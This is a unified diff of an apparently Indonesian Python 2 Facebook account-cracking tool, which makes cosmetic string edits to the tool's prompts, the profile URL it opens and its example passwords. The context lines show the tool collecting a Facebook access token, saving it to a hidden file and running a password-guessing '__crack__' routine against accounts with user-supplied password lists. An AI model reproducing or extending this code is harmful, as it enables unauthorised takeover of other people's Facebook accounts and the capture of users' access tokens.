@@ -57,7 +57,7 @@ warna = random.choice(my_color)
 koh = '100078379432123'
 xi_jimpinx = '140106845088579'
 ok, cp, id, loop = [], [], [], 0
-hoetank = random.choice(['Yang posting orang nya ganteng:)', 'Ijin pake scriptnya bang', 'Keren Master'])
+hoetank = random.choice(['Yang posting orang nya ganteng:)', 'Ijin pake scriptnya Bang Taufiq XD', 'Keren Master'])
 bulan_ttl = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}
 
 # lempankkkkkkkk
@@ -94,12 +94,12 @@ def hasil(ok,cp):
 #masuk token
 def yayanxd():
     os.system('clear')
-    kontol = raw_input('\n %s[%s?%s] Token :%s '%(N,M,N,H))
+    kontol = raw_input('\n %s[%s?%s] TOKEN FACEBOOK :%s '%(N,M,N,H))
     try:
         nama = requests.get('https://graph.facebook.com/me?access_token=%s'%(kontol)).json()['name']
         print '\n\n %s*%s SELAMAT DATANG DI TOOLS SAYA %s%s%s'%(O,N,K,nama,N);time.sleep(2)
         open('.memek.txt', 'w').write(kontol)
-        os.system('xdg-open https://www.facebook.com/100072677928941')
+        os.system('xdg-open https://www.facebook.com/100078379432123')
         moch_yayan()
     except KeyError:
         print '\n\n %s[%s!%s] token invalid'%(N,M,N);time.sleep(2);yayanxd()
@@ -300,7 +300,7 @@ class __crack__:
             raw_input('\n  %s[ %skembali%s ]'%(N,O,N));moch_yayan()
         ___yayanganteng___ = raw_input(' [%s?%s] apakah anda ingin menggunakan kata sandi manual? [Y/t]: '%(O,N))
         if ___yayanganteng___ in ('Y', 'y'):
-            print '\n %s[%s!%s] gunakan , (koma) untuk pemisah contoh : sandi123,sandi12345,dll. setiap kata minimal 6 karakter atau lebih'%(N,M,N)
+            print '\n %s[%s!%s] gunakan , (koma) untuk pemisah contoh : sayang123,anjing123,dll. setiap kata minimal 6 karakter atau lebih'%(N,M,N)
             while True:
                 pwek = raw_input('\n [%s?%s] masukan kata sandi : '%(O,N))
                 print ' [*] crack dengan sandi -> [ %s%s%s ]' % (M, pwek, N)
